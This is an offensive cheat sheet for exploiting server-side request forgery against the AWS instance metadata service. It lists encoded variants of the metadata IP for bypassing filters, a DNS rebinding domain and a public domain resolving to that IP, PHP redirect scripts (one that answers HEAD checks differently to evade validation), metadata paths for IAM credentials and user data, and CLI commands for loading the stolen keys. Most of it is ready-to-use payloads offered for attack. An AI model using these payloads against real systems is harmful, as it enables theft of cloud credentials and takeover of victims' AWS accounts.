# SSRF AWS Cheat Sheet

## 🚀 Identifying SSRF
- Check for user-controlled URL parameters (`url=`, `redirect=`, `file=`).
- Observe response differences when passing internal vs. external URLs.
- Look for reflected or stored SSRF scenarios.

---

## 🔍 Exploiting AWS Metadata Service
### **Standard AWS Metadata URL:**  
```
http://169.254.169.254/latest/meta-data/
```

### **Alternative Encodings (Bypassing Filters):**  
```
http://169.254.169.254  
http://0251.0376.0251.0376  
http://0xa9.0xfe.0xa9.0xfe  
http://0xa9fea9fe  
http://2852039166  
http://4777115998  
http://169.254.43452  
http://0xA9FEA9FE  
http://0xa9fe.a9fe  
http://0251.0376.0251.0376  
http://0251.0376.43230  
http://2852039166  
http://4777115998  
http://0xa9fea9fe  
http://0xa9.0xfe.0xa9.0xfe  
http://169.254.0xA9FE  
http://169.254.43452  
http://0xa9fe.a9fe  
http://0251.0376.0251.0376  
http://0251.0376.43230  
http://2852039166  
```

---

## 🧐 DNS Rebinding Attack
If direct access is blocked, try DNS rebinding:
- Use a DNS rebinding service: [Rebinder](https://lock.cmpxchg8b.com/rebinder.html)
- Example domain:
  ```
  01010101.a9fea9fe.rbndr.us
  ```

---

## 🛠 SSRF via Public Domain
A public domain that resolves to AWS metadata IP can be used for SSRF attacks. By pointing a domain to `169.254.169.254`, requests to this domain will effectively be redirected to AWS metadata service.
```
aws.yeganof.com.  300  IN  A  169.254.169.254
```
Attackers can use `aws.yeganof.com` in SSRF payloads to interact with AWS metadata.

---

## 🌐 Self-Hosting for Testing SSRF (Cloudflare Tunnel)
Create a local PHP server and expose it via Cloudflare Tunnel:
```sh
php -S 0.0.0.0:8081  
cloudflared tunnel --url http://localhost:8081  
```

Use the following PHP script to redirect requests:
```php
<?php
header("Location: http://169.254.169.254");
exit();
?>
```

---

## 🛡️ Bypassing HEAD Request Validations
```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'HEAD') {
    header("HTTP/1.1 200 OK");
    header("X-SSRF-Test: Head-Response");
    exit();
}
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    header("HTTP/1.1 200 OK");
    header("Content-Type: text/html");
    header("location: http://169.254.169.254");
    exit();
}
header("HTTP/1.1 405 Method Not Allowed");
exit();
?>
```

---

## ⚡ Extracting AWS Credentials
After accessing `http://169.254.169.254/latest/meta-data/`, check:
- **IAM Role Credentials:**  
  ```
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```
- **Instance ID:**  
  ```
  http://169.254.169.254/latest/meta-data/instance-id
  ```
- **User Data:**  
  ```
  http://169.254.169.254/latest/user-data
  ```

### **Using Extracted Credentials in AWS CLI:**
```sh
aws configure set aws_access_key_id <ACCESS_KEY> --profile temp-creds  
aws configure set aws_secret_access_key <SECRET_KEY> --profile temp-creds  
aws configure set aws_session_token "<SESSION_TOKEN>" --profile temp-creds  
```

---

🌟 **Happy Hacking!** 🏴‍☠️

